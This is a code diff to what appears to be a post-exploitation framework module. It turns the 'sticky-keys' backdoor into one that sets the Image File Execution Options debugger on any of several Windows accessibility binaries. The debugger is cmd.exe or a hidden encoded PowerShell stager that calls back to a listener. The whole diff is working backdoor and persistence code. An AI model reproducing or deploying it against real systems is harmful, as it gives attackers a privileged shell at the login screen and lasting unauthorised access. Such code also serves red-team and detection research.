@@ -5,13 +5,13 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-StickyKeys',
+            'Name': 'Invoke-AccessBinary',
 
             'Author': ['@harmj0y'],
 
-            'Description': ("Sets the debugger for sethc.exe to be cmd.exe (aka the 'sticky-keys' "
-                            "backdoor), another binary of your choice, or a listener stager. This can be launched from "
-                            "the ease-of-access center or by pressing shift 5 times."),
+            'Description': ("Sets the debugger for a specified target binary to be cmd.exe, "
+                            "another binary of your choice, or a listern stager. This can be launched from "
+                            "the ease-of-access center (ctrl+U)."),
 
             'Background' : False,
 
@@ -40,17 +40,22 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'TargetBinary' : {
+                'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
+                'Required'      :   True,
+                'Value'         :   'sethc.exe'
+            },
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
                 'Value'         :   'HKLM:Software\Microsoft\Network\debug'
             },
             'Cleanup' : {
-                'Description'   :   'Switch. Disable the sethc.exe debugger.',
+                'Description'   :   'Switch. Disable the Utilman.exe debugger.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'Binary' : {
+            'TriggerBinary' : {
                 'Description'   :   'Binary to set for the debugger.',
                 'Required'      :   False,
                 'Value'         :   'C:\Windows\System32\cmd.exe'
@@ -72,8 +77,9 @@ class Module:
 
         # management options
         cleanup = self.options['Cleanup']['Value']        
-        binary = self.options['Binary']['Value']
+        triggerBinary = self.options['TriggerBinary']['Value']
         listenerName = self.options['Listener']['Value']
+        targetBinary = self.options['TargetBinary']['Value']
 
         # storage options
         regPath = self.options['RegPath']['Value']
@@ -83,8 +89,8 @@ class Module:
 
 
         if cleanup.lower() == 'true':
-            # the registry command to disable the debugger for sethc.exe
-            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';'sethc.exe debugger removed.'"
+            # the registry command to disable the debugger for Utilman.exe
+            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
             return script
         
 
@@ -117,10 +123,10 @@ class Module:
             # note where the script is stored
             locationString = "$((gp "+path+" "+name+")."+name+")"
 
-            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'sethc.exe debugger set to trigger stager for listener "+listenerName+"'"
+            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+targetBinary+" debugger set to trigger stager for listener "+listenerName+"'"
 
         else:
-            # the registry command to set the debugger for sethc.exe to be the binary path specified
-            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name Debugger -Value '"+binary+"';'sethc.exe debugger set to "+binary+"'"
+            # the registry command to set the debugger for the specified binary to be the binary path specified
+            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
 
         return script
